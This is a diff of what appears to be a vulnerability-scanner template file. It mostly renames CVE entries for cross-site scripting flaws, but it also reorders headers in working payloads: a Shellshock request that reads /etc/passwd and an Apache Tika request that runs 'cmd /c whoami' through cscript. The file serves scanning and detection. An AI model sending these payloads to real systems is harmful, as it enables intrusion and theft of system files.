@@ -3354,9 +3354,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -4861,7 +4861,7 @@
     {
       "id": "CVE-2016-8527",
       "info": {
-        "name": "Aruba Airwave - (XSS)",
+        "name": "Aruba Airwave <8.2.3.1 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -5471,7 +5471,7 @@
     {
       "id": "CVE-2017-18536",
       "info": {
-        "name": "Stop User Enumeration 1.3.5-1.3.7 - Reflected Cross-Site Scripting (XSS)",
+        "name": "WordPress Stop User Enumeration <=1.3.7 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -5911,7 +5911,7 @@
     {
       "id": "CVE-2018-1000129",
       "info": {
-        "name": "Jolokia XSS",
+        "name": "Jolokia 1.3.7 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -5985,7 +5985,7 @@
     {
       "id": "CVE-2018-1000671",
       "info": {
-        "name": "Sympa version 6.2.16 - Open redirect and XSS",
+        "name": "Sympa version =>6.2.16 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -6046,7 +6046,7 @@
     {
       "id": "CVE-2018-10095",
       "info": {
-        "name": "Dolibarr before 7.0.2 allows XSS.",
+        "name": "Dolibarr <7.0.2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -6061,7 +6061,7 @@
     {
       "id": "CVE-2018-10141",
       "info": {
-        "name": "GlobalProtect Login page XSS",
+        "name": "Palo Alto Networks PAN-OS GlobalProtect <8.1.4 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -6094,7 +6094,7 @@
     {
       "id": "CVE-2018-10230",
       "info": {
-        "name": "Zend Server < 9.13 - XSS",
+        "name": "Zend Server <9.13 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -6440,7 +6440,7 @@
     {
       "id": "CVE-2018-12998",
       "info": {
-        "name": "Zoho manageengine Arbitrary Reflected XSS",
+        "name": "Zoho manageengine - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -6462,11 +6462,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Expect": "100-continue",
+            "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -6493,7 +6493,7 @@
     {
       "id": "CVE-2018-13380",
       "info": {
-        "name": "Fortinet FortiOS Cross-Site Scripting",
+        "name": "Fortinet FortiOS - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -6524,7 +6524,7 @@
     {
       "id": "CVE-2018-14013",
       "info": {
-        "name": "Zimbra XSS",
+        "name": "Synacor Zimbra Collaboration Suite Collaboration <8.8.11 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -7053,7 +7053,7 @@
     {
       "id": "CVE-2018-18570",
       "info": {
-        "name": "Cross-Site Scripting on Planon web application",
+        "name": "Planon <Live Build 41 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -7068,7 +7068,7 @@
     {
       "id": "CVE-2018-18608",
       "info": {
-        "name": "DedeCMS V5.7 - Cross Site Scripting",
+        "name": "DedeCMS 5.7 SP2 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14732,7 +14732,7 @@
     {
       "id": "CVE-2021-24991",
       "info": {
-        "name": "The WooCommerce PDF Invoices & Packing Slips WordPress plugin < 2.10.5 - XSS",
+        "name": "WooCommerce PDF Invoices & Packing Slips WordPress Plugin < 2.10.5 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -14761,7 +14761,7 @@
     {
       "id": "CVE-2021-25008",
       "info": {
-        "name": "The Code Snippets WordPress plugin < 2.14.3 - XSS",
+        "name": "The Code Snippets WordPress Plugin < 2.14.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
